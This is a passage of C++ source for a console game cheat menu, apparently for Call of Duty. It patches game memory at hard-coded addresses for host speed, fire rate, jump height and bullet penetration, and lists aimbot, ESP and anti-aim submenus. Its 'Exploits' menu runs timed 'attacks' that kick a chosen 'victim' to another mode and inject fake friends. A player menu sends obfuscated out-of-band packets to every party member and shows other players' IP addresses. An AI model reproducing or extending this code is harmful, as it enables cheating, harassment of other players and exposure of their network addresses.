		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addCheck3(String title, bool& check, const char(*menudescription)) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		SND_Play(hash("cac_grid_equip_item"), 1, 1),
		check = !check, noshit(), Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {

		DrawShader(menu->x + (menu->msize / 2) - 10, 262 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 18, 18, 0, check ? color(55, 255, 55, 255) : color(55, 55, 55, 200), menu_mp_killstreak_select, align_right);
		if (active)DrawText(menudescription, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addArray(String option, String items[], size_t size, void(*func)(int index), bool bSLLR) {
	int count = size - 1;
	if (active) {
		SLLR = bSLLR;
		if (ready) {
			if (PadDown(PAD_LEFT)) {
				SND_Play(hash("cac_safearea"), 1, 1),
					Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] = (Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] <= 0) ? count : Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] - 1,
					func(Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]]), Wait(150);
			}
			if (PadDown(PAD_RIGHT)) {
				SND_Play(hash("cac_safearea"), 1, 1),
					Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] = (Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] >= count) ? 0 : Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]] + 1,
					func(Mshit.islide[Mshit.id][Mshit.scroll[Mshit.id]]), Wait(150);
			}
		}
	}

	else {

		SLLR = false;
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {

		String psz_cur = items[Mshit.islide[Mshit.id][Mshit.maxscroll[Mshit.id]]];
		DrawText(option, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
		DrawText(items[Mshit.islide[Mshit.id][Mshit.maxscroll[Mshit.id]]], Vector2(menu->x + (menu->msize / 2) - 10, 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

#pragma region render combo
int test;
void combo_render_ui() {
	if (Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.scroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		if (menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].opened && menu->combo_active) {
			const char** data = menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].data;
			DrawShader(menu->x + (menu->msize / 2) - 10, 267 + 15 - 27 + ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 100, menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].maxscroll * 30, 0, color(42, 42, 42, 255), white, align_right);
			DrawShader(menu->x + (menu->msize / 2) - 10, 267 + 15 - 27 + ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) + (menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll * 30), 100, 30, 0, color(0, 0, 0, 190), white, align_right);
			for (int i = 0; i < menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].maxscroll; i++)
				DrawText(data[i], Vector2(menu->x + (menu->msize / 2) - 57, 267 + 15 + ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) + (i * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), (menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll == i) ? menu->skin : color(255, 255, 255, 255), align_center, 1);
		}
	}
}

#pragma endregion


void addCombo(String option, String data[], int size, int tag, void(*func)(int info), const char(*menudescription[])) {
	int id = Mshit.id;
	menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].data = data;
	menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].maxscroll = size;
	menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].size = size;
	menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].func = func;
	if (menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].opened && menu->combo_active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				menu->combo_active = menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].opened = false;
				SND_Play(hash("cac_grid_equip_item"), 1, 1);
				Wait(150);
			}

			if (PadDown(PAD_CIRCLE, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				menu->combo_active = false;
				menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].opened = false;
				SND_Play(hash("cac_grid_equip_item"), 1, 1);
				Wait(150);
			}

			if (PadDown(PAD_UP)) {
				menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll = menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll <= 0 ? menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].maxscroll - 1 : menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll - 1, menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].func(menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll);
				SND_Play(hash("cac_grid_nav"), 1, 1);
				Wait(bot.scspeed);


			}
			if (PadDown(PAD_DOWN)) {
				menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll = menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll >= menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].maxscroll - 1 ? 0 : menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll + 1, menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].func(menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].scroll);
				SND_Play(hash("cac_grid_nav"), 1, 1);
				Wait(bot.scspeed);
			}
		}
	}

	if (active && ready && ((PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) || (PadDown(PAD_CIRCLE, CELL_PAD_BTN_OFFSET_DIGITAL2))) && !menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].opened) {
		menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].opened = true;
		SND_Play(hash("cac_grid_equip_item"), 1, 1);
		menu->combo_active = true;
		Wait(150);
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {

		if (!menu->combos[Mshit.id][Mshit.maxscroll[Mshit.id]].opened)
			DrawShader(menu->x + (menu->msize / 2) - 10, 267 + 15 - 23 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 100, 23, 0, color(42, 42, 42, 255), white, align_right),
			DrawText(data[tag], Vector2(menu->x + (menu->msize / 2) - 57, 267 + 15 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_center, 1);
		if (active)DrawText(menudescription[tag], Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(option, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, 1);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addPlayerSub(String playername, String playerip, String playernat, int id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready)
		SND_Play(hash("cac_screen_fade"), 1, 1),
		Mshit.id = id, Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(playerip, Vector2(menu->x + (menu->msize / 2) - 150, 283 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
		DrawText(playernat, Vector2(menu->x + (menu->msize / 2) - 15, 283 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_right, active ? 1 : 0);
	}

	addOption(playername);
}

void addPlayerSubV1(String playername, int id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready)
		SND_Play(hash("cac_screen_fade"), 1, 1),
		Mshit.id = id, Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
	}

	addOption(playername);
}

#pragma endregion

void slide_chams_r(float value) {
	WriteMemory(0x01CC1438, &value, 4);
}

void slide_chams_g(float value) {
	WriteMemory(0x01CC1438 + 0x4, &value, 4);
}

void slide_chams_b(float value) {
	WriteMemory(0x01CC1438 + 0xC, &value, 4);
}

void SlideRed(float r) {
	menu->colorslide.r = r;
}

void SlideGreen(float r) {
	menu->colorslide.g = r;
}

void SlideBlue(float r) {
	menu->colorslide.b = r;
}

void SlideRed1(float r) {
	menu->colorslide1.r = r;
}

void SlideGreen1(float r) {
	menu->colorslide1.g = r;
}

void SlideBlue1(float r) {
	menu->colorslide1.b = r;
}

void slide_props(float r) {
	menu->props = r;
}

void Lookup_ConstTable(Material* Material, int index, Vector4 Modifier) {
	if (!Material) return;
	memcpy(&Material->Constants[index].vVec4, &Modifier, sizeof(Vector4));
}

void camo_render() {
	if (bot.camotype == WEAPONIZED) {
		Material* Toxic = Material_RegisterHandle(hash("mc/mtl_weapon_camo_toxic"), 7);
		if (Toxic) {
			Lookup_ConstTable(Toxic, 2, Vector4(menu->Reflection, 0, 0, 0));//Reflection
			Lookup_ConstTable(Toxic, 3, Vector4(menu->Layer3Scroll, 0, 0, 0));//Layer3Scroll
			Lookup_ConstTable(Toxic, 4, Vector4(menu->Emissive_Amo, 0, 0, 0));//Emissive_Amo
			Lookup_ConstTable(Toxic, 11, Vector4(menu->normalheight, 0, 0, 0));//normalheight
			Lookup_ConstTable(Toxic, 12, Vector4(menu->Layer1ScrollX, menu->Layer1ScrollY, 0, 0));//Layer1Scroll
			Lookup_ConstTable(Toxic, 15, Vector4(menu->Layer1W, menu->Layer1H, 0, 0));//Layer1Scale
			Lookup_ConstTable(Toxic, 16, Vector4(menu->Layer2ScrollX, menu->Layer2ScrollY, 0, 0));//menu->Layer2Scroll
			Lookup_ConstTable(Toxic, 17, Vector4(menu->Layer1Alpha, 0, 0, 0));//Layer1Alpha
			Lookup_ConstTable(Toxic, 18, Vector4(menu->Layer1Depth, 0, 0, 0));///Layer1Depth
			Lookup_ConstTable(Toxic, 25, Vector4(menu->Gloss_Amount, 0, 0, 0));///Gloss_Amount
		}
	}
}

void ResetHost() {
	bot.fspeed = 1.070f; bot.fweapmulti = 0.75f; bot.jheight = 78.0f;
	*(float*)0x01cb3098 = 1.07f;
	*(float*)0x01cb2af8 = 0.75f;
	*(float*)0x005be0b4 = 78.0f;
}

void set_color(int index) {
	cur_index_theme = index;
}

void Fmj_scale(float value) { menu->fmj = value; }
void Damage_scale(float value) { menu->damage = value; }
void Menusize_scale(float value) { menu->menusize = value; }
void Menufade_scale(float value) { menu->menufade = value; }
void MenuBfade_scale(int value) { menu->bfade = value; }

int OfflineAsset = *(int*)0x0129203c;
int OnlineAsset = *(int*)0x012920d4;

int i = 0;

//**kiwi_modz c++ method**
unsigned char InfectionAsset[0x3FF0];//readfile data here

bool ronece = false;

int CG_SetThirdPerson_t[2] = { 0x61558, TOC };
void(*CG_SetThirdPerson_f)(int c, bool rs) = (void(*)(int, bool))CG_SetThirdPerson_t;

bool runonce1 = false;
int Session_IsHost_t[2] = { 0x537A08, TOC };
bool(*Session_IsHost_f)(int, int) = (decltype(Session_IsHost_f))Session_IsHost_t;

void cheats_render() {

	static bool framewait = false;

	//CG_SetThirdPerson_f(0, bot.bthirdp);
	//0x774724 no fog
	if (framewait) {

		camo_render();
		local->zoommap = 2500 + bot.esp.scale;
		WriteMemory(compassMaxRange, &local->zoommap, 4);
		*(int*)0x1CD7B78 = menu->SMPing;//searchSessionDedicatedMaxPing

		if (menu->frenderfovx != 65.0f) {
			//if (!zombiecheck())
			*(float*)0x01cc5218 = menu->frenderfovx;
			///*else*/
			//	*(float*)0x01cc52d8 = menu->frenderfovx;
		}
		if (local->ishost) {
			if (bot.fspeed != 1.07f) {
				*(bool*)0x01DFE73 = true;//if statment bne == 0
				*(bool*)0x01cb3095 = true;//enable dvar
				*(float*)0x01cb3098 = bot.fspeed;
			}

			else if (*(bool*)0x01DFE70) {
				*(bool*)0x01DFE73 = false;//if statment restore
				*(bool*)0x01cb3095 = false;//disable dvar

			}

			if (bot.fweapmulti != 0.75f) {
				*(bool*)0x005f421b = true;//if statment bne == 0
				*(bool*)0x01cb2af5 = true;//enable dvar
				*(float*)0x01cb2af8 = bot.fweapmulti;
			}

			else if (*(bool*)0x005f421b) {
				*(bool*)0x005f421b = false;//if statment restore
				*(bool*)0x01cb2af5 = false;//disable dvar

			}

			if (bot.jheight != 78.0f) {
				*(float*)0x005be0b4 = pow(bot.jheight, 2);
				*(bool*)0x01cb1298 = false;
			} else if (*(bool*)0x01cb1298 == false) {
				*(bool*)0x01cb1298 = true;
			}
		}

		else {
			ResetHost();
		}
	}
	framewait ^= true;
	//r_lightGridIntensity 0x01cc1318 = 1.0f default set to 0 add to night mode
	//v_sync 0x01cbc518 0 
	//r_vsyncThreshold 0x01cbc57b 0xA default set to 0xF
	//r_enableplayershadow 0x01cbe678 1
	//r_exposureValue 0x01cc1078 40400000 default set to 40AFFFF2
	//r_missile_cam_debug_display 0x01cc2518 set 1 disable map 
}

bool runonlyonce = true, resettheme = false;

void enableresettheme() {
	resettheme = true;
	menu->menux = 0;
	menu->menuy = (dc.height > 720) ? 0 : -120;
}

void enableresetweaponized() {
	menu->Reflection = 0.5f;
	menu->Layer1ScrollX = 0.0f;
	menu->Layer2ScrollX = 0.0f;
	menu->Layer1ScrollY = 0.0f;
	menu->Layer2ScrollY = 0.0f;
	menu->Layer1Depth = 0.7f;
	menu->Layer1Alpha = 1.1f;
	menu->Layer1H = 1.0f;
	menu->Layer1W = 1.0f;
	menu->Layer3Scroll = 0.0f;
	menu->Emissive_Amo = 3.5f;
	menu->Gloss_Amount = 1.0f;
}

void MoveUp() {
	menu->menuy -= 3;
	menu->menuyc = menu->menuy;
}

void MoveDown() {
	menu->menuy += 3;
	menu->menuyc = menu->menuy;
}

void MoveLeft() {
	if (menu->menux > (-dc.width / 2) + (menu->msize / 2) + 15)
		menu->menux -= 3;
	menu->menuxc = menu->menux;
}

void MoveRight() {
	if (menu->menux < (dc.width / 2) - (menu->msize / 2) - 15)
		menu->menux += 3;
	menu->menuxc = menu->menux;
}

colorbyte FlashBonk;
colorbyte Red(255, 255, 0, 0);
colorbyte Blue(255, 0, 0, 255);
colorbyte White21(255, 255, 255, 255);
bool runonlyonce1 = false;
uint wateva;
bool keker = false;
int LobbyPname;
bool runoneces = false;
bool runoneces1 = false;
int Savedkeytype;
int Savedtagtype;
bool ingameonce;

void resetipflags() {
	if (!cl_ingame_()) {
		if (!ingameonce) {
			for (int i = 0; i <= 18; i++) {
				local->iplayer[i] = false;
				local->pplayer[i] = false;
			}
			ingameonce = true;
		}
	} else {
		ingameonce = false;
	}
}

const char* nameip[18];
char nattype;
char MenuBufff[50];
char NatBufff[30];
char tempdBufff[50];
char cooldownBufff[200];
char stoptimeoutamout[200];

void addPSubmenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {

		SND_Play(hash("cac_screen_fade"), 1, 1);
		Mshit.id = sub_id; iRecent = title;

		for (int i = 0; i < 18; i++) {

			V3_Users[i] = false;
			gaybab_Users[i] = false;

			PartyMember pM = GetPartyMemeber(i);
			NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, VirtualXOR(hash("icmabj~vw"), 10).c_str(), VirtualXOR(hash("icmabj~vw"), 10).size());//challenge
			NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, VirtualXOR(hash("NdUb{GqgwXqwwu"), 10).c_str(), VirtualXOR(hash("NdUb{GqgwXqwwu"), 10).size());//DoYouHaveKebab
		}
		Wait(200);
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {

		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

dvar_t* penetration_count;
dvar_t* penetration_multiplier;
dvar_t* penetration_min_fx_dist;

void RenderMenu() {

	if (cl_ingame_()) {
		if (bot.cancelreload) {
			if (cg->health > 0) {
				Cancel_Reload();
			}
		}
	}

	if (cl_ingame_()) {

		if (!penetration_count && !penetration_multiplier && !penetration_min_fx_dist) {
			penetration_count = Dvar_FindVar(hash("penetrationCount"));
			penetration_multiplier = Dvar_FindVar(hash("perk_bulletPenetrationMultiplier"));
			penetration_min_fx_dist = Dvar_FindVar(hash("bullet_penetrationMinFxDist"));
		}

		if (menu->hostaw) {
			if (cg->health > 0) {
				if (local->ishost) {
					penetration_count->current.integer = INT_MAX;
					penetration_multiplier->current.value = FLT_MAX;
					penetration_min_fx_dist->current.value = std::sqrtf(FLT_MAX);
				} else {
					penetration_count->current.integer = penetration_count->reset.integer;
					penetration_multiplier->current.value = penetration_multiplier->reset.value;
					penetration_min_fx_dist->current.value = penetration_min_fx_dist->reset.value;
				}
			}
		} else {
			if (menu->hostawor && cg->health > 0) {
				penetration_count->current.integer = INT_MAX;
				penetration_multiplier->current.value = FLT_MAX;
				penetration_min_fx_dist->current.value = std::sqrtf(FLT_MAX);
			} else {
				penetration_count->current.integer = penetration_count->reset.integer;
				penetration_multiplier->current.value = penetration_multiplier->reset.value;
				penetration_min_fx_dist->current.value = penetration_min_fx_dist->reset.value;
			}
		}

	}

	resetipflags();

	_Buttoninfo();

	movement_event();

	Ui_interface();

	if (runonlyonce || resettheme) {

		menu->colorslide = color(128, 15, 255, 255);
		menu->colorslide1 = color(128, 15, 255, 255);
		menu->colorslide2 = color(128, 15, 255, 255);
		menu->colorslide3 = color(128, 15, 255, 255);
		menu->colorslide4 = color(128, 15, 255, 255);
		menu->colorslide5 = color(128, 15, 255, 255);
		menu->colorslide6 = color(128, 15, 255, 255);

		menu->skin = color(128, 15, 255, 255);
		menu->skin2 = color(128, 15, 255, 255);
		menu->skin3 = color(128, 15, 255, 255);
		menu->skin4 = color(128, 15, 255, 255);
		menu->skin5 = color(128, 15, 255, 255);
		menu->skin6 = color(128, 15, 255, 255);

		menu->msize = 400;
		bot.scspeed = 150;

		resettheme = false;
		runonlyonce = false;
	}

	if (menu->fn.Rainbow) {

		menu->fn.Interpolate(0.0f);
	}
	if (menu->en.Rainbow) {

		menu->en.Interpolate(0.0f);
	}
	if (menu->xh.Rainbow) {

		menu->xh.Interpolate(0.0f);
	}
	if (menu->trcr.Rainbow) {

		menu->trcr.Interpolate(0.0f);
	}
	if (menu->vis.Rainbow) {

		menu->vis.Interpolate(0.0f);
	}
	if (menu->hitble.Rainbow) {

		menu->hitble.Interpolate(0.0f);
	}
	if (menu->rgbac.Rainbow) {

		menu->rgbac.Interpolate(0.0f);
	}
	if (menu->hb.Rainbow) {

		menu->hb.Interpolate(0.0f);
	}

	if (menu->fade && !menu->lockcolor) {

		menu->skin3.Interpolate(0.0f);
		menu->skin3.RainbowSpeed = menu->menufade;
		menu->skin3.Rainbow = menu->fade;
		menu->skin4.Interpolate(0.5f);
		menu->skin4.RainbowSpeed = menu->menufade;
		menu->skin4.Rainbow = menu->fade;
		menu->skin5.Interpolate(1.0f);
		menu->skin5.RainbowSpeed = menu->menufade;
		menu->skin5.Rainbow = menu->fade;
		menu->skin6.Interpolate(1.5f);
		menu->skin6.RainbowSpeed = menu->menufade;
		menu->skin6.Rainbow = menu->fade;
		menu->skin = menu->skin3;
		menu->skin2 = menu->skin4;
		menu->colorslide1 = menu->skin;
		menu->colorslide2 = menu->skin2;
		menu->colorslide3 = menu->skin3;
		menu->colorslide4 = menu->skin4;
		menu->colorslide5 = menu->skin5;
		menu->colorslide6 = menu->skin6;
	}

	else if (menu->fade && menu->lockcolor) {

		menu->skin3.Interpolate(0.0f);
		menu->skin3.RainbowSpeed = menu->menufade;
		menu->skin3.Rainbow = menu->fade;
		menu->skin4.Interpolate(0.0f);
		menu->skin4.RainbowSpeed = menu->menufade;
		menu->skin4.Rainbow = menu->fade;
		menu->skin5.Interpolate(0.0f);
		menu->skin5.RainbowSpeed = menu->menufade;
		menu->skin5.Rainbow = menu->fade;
		menu->skin6.Interpolate(0.0f);
		menu->skin6.RainbowSpeed = menu->menufade;
		menu->skin6.Rainbow = menu->fade;
		menu->skin = menu->skin3;
		menu->skin2 = menu->skin4;
		menu->colorslide1 = menu->skin;
		menu->colorslide2 = menu->skin2;
		menu->colorslide3 = menu->skin3;
		menu->colorslide4 = menu->skin4;
		menu->colorslide5 = menu->skin5;
		menu->colorslide6 = menu->skin6;
	}

	else if (menu->lockcolor) {

		menu->skin = menu->skin3;
		menu->skin2 = menu->skin3;
		menu->skin3 = menu->skin3;
		menu->skin4 = menu->skin3;
		menu->skin5 = menu->skin3;
		menu->skin6 = menu->skin3;
	}

	if (menu->camocolor && (cl_ingame_() && cg->health > 0)) {
		uint8_t r = 255 * menu->rgbac.r;
		uint8_t g = 255 * menu->rgbac.g;
		uint8_t b = 255 * menu->rgbac.b;
		uint8_t a = 255 * menu->rgbac.a;
		uint32_t color =
			((a) << 24) +
			((r) << 16) +
			((g) << 8) +
			(b);

		WriteMemory((0xcd34ed80), &color, 0x04);
	}
	if (!Mshit.Mopened && menu->x >= 1800) return;

	menu->OptPos = Vector2(menu->x, menu->y);

	switch (Mshit.id) {

	case ID_MAIN:
		addTitle(encryptDecrypt(hash("FDOHRXR!CN3")).c_str(), ID_MAIN);
		DrawText(encryptDecrypt(hash("cx!jhvh^lne{")).c_str(), Vector2((menu->x + 5) - (menu->msize / 2), (dc.height > 720) ? 277 + menu->height + (30 / 3) : 277 + menu->height + 10), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		addSubmenu(hash("Aimbot"), ID_AIMBOT);
		addSubmenu(hash("Esp"), ID_ESP);
		addSubmenu(hash("Antiaim"), ID_ANTIAIM);
		addSubmenu(hash("Cheats"), ID_CHEATS);
		addSubmenu(hash("GamerTag"), ID_GAMERTAG);
		addSubmenu(hash("Exploits"), ID_EXPLOITS);
		addPSubmenu(hash("Players"), ID_PLAYERS);
		addFriendSubmenu(hash("Friends"), ID_RECENTLIST);
		addSubmenu(hash("Account"), ID_ACCOUNT);
		addSubmenu(hash("Theme"), ID_THEME);
		AddConfigMenu(hash("Configure"), ID_HVH);
		addSubmenu(hash("Settings"), ID_SETTINGS);
		addSubmenu(hash("Assets"), ID_CAMO);
		if (local->ishost) {
			addSubmenu(hash("Host"), ID_HOST);
		}
		break;
	case ID_EXPLOITS:
		addTitle(hash("Exploits"), ID_MAIN);
		addKOption(hash("Join By Name"), JoinByName);
		snprintf(cooldownBufff, sizeof(cooldownBufff), hash("Kicks selected player to zombies (^1%i ^7second timeout)"), pullcooldown);
		addKOption(hash("Send To Zm By Name"), SendByName, cooldownBufff);
		addKOption(hash("Add Custom Friend To Fake Friends List"), AddXname);
		addPSubmenu(hash("Player Exploits"), ID_PLAYERSV1);
		addBarI(hash("Exploit Timeout In Seconds"), 10, 10000, menu->exploittimeout, 10, hash("How long it attempts to send the victim to zm"));
		snprintf(stoptimeoutamout, sizeof(stoptimeoutamout), hash("Stops current attack (^1%i ^7second timeout)"), pullcooldown);
		addCOption(hash("Stop Current Attack"), stoptimeoutamout, StopAtak);
		break;
	case ID_HOST:
		addTitle(hash("Host Menu"), ID_MAIN);
		addCheck2(hash("Host AutoWall"), menu->hostaw, hash("Improves autowall....like afuckinglot"));
		addCheck2(hash("Infinite Ammo"), menu->Iammo, hash("Enables infinite ammo for the lobby"));
		addBar(hash("Speed Multiplier"), 0.0f, 6.0f, bot.fspeed, 0.1f, hash("Lobby speed"));
		addBar(hash("Fire Rate Multiplier"), 0.0f, 3.25f, bot.fweapmulti, 0.1f, hash("Rapid fire"));
		addBar(hash("Jump Height"), 0.0f, 1000.0f, bot.jheight, 20.0f, hash("Jump height"));
		addOption(hash("Reset Mods"), ResetHost);
		break;
	case ID_CAMO:
		addTitle(hash("Custom Assets"), ID_MAIN);
		addCombo(hash("Camos"), camotypes, SizeOf(camotypes), bot.camotype, camo_type, aimtypesDec);
		addSubmenu(hash("Player Assets"), ID_PLAYER);
		if (bot.camotype == DEFAULT) {
			addInt1(hash("Camo Spoofer"), 0, 50, 1, menu->flagx, hash("Requires default camo"));
		}
		if (bot.camotype == WEAPONIZED) {
			menu->flagx = 43;
			AddCamoMenu(hash("Custom Weaponized Camos"), ID_CAMOS);
			addBar(hash("Reflection"), 0.0f, 10.0f, menu->Reflection, 0.1f, hash("Reflection"));
			addBar(hash("Emissive"), 0.0f, 10.0f, menu->Emissive_Amo, 0.1f, hash("Emissive"));
			addBar(hash("Gloss"), 0.0f, 10.0f, menu->Gloss_Amount, 0.1f, hash("Gloss"));
			addBar(hash("Animate Layer1 X"), -2.0f, 2.0f, menu->Layer1ScrollX, 0.1f, hash("Animation X"));
			addBar(hash("Animate Layer1 Y"), -2.0f, 2.0f, menu->Layer1ScrollY, 0.1f, hash("Animation Y"));
			addBar(hash("Normal Map Height"), -20.0f, 20.0f, menu->normalheight, 0.1f, hash("Normal map height"));
			addBar(hash("Layer1 Depth"), -10.0f, 10.0f, menu->Layer1Depth, 0.1f, hash("Depth"));
			addBar(hash("Layer1 Width"), -10.0f, 10.0f, menu->Layer1W, 0.1f, hash("Layer1 width"));
			addBar(hash("Layer1 Height"), -10.0f, 10.0f, menu->Layer1H, 0.1f, hash("Layer1 height"));
			addBar(hash("Layer1 Alpha"), -1.0f, 1.1f, menu->Layer1Alpha, 0.01f, hash("Layer1 alpha"));
			addBar(hash("Animate Layer2 X"), -1.0f, 1.0f, menu->Layer2ScrollX, 0.01f, hash("Animation X"));
			addBar(hash("Animate Layer2 Y"), -1.0f, 1.0f, menu->Layer2ScrollY, 0.01f, hash("Animation Y"));
